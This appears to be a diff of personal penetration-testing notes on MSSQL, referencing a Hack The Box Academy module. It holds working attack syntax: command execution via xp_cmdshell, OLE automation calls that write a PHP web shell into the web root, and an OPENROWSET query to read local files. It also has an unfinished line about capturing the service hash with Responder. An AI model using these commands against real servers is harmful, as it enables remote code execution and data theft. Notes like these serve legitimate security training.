@@ -27,6 +27,11 @@ set rhosts <ip>
 exploit
 ```
 
+-Capturing MSSQL Service Hash:
+
+We can first use responder to create a fake 
+
+
 Post Entry:
 
 We can use xp_cmdshell to execute arbitrary command:
@@ -65,12 +70,17 @@ After that, we can create file with MSSQL:
 3> EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
 4> EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, '<path_to_file>', 8, 1
 4Example> EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
-5> EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
+5> EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<stringtofile>'
+5Example> EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
 6> EXECUTE sp_OADestroy @FileID
 7> EXECUTE sp_OADestroy @OLE
 8> GO
 ```
-
+With Permission, we can read local files with MSSQL:
+```
+1> SELECT * FROM OPENROWSET(BULK N'<fileabspath>', SINGLE_CLOB) AS Contents
+2> GO
+```
 
 
 Ref: https://academy.hackthebox.com/app/module/112/section/1246
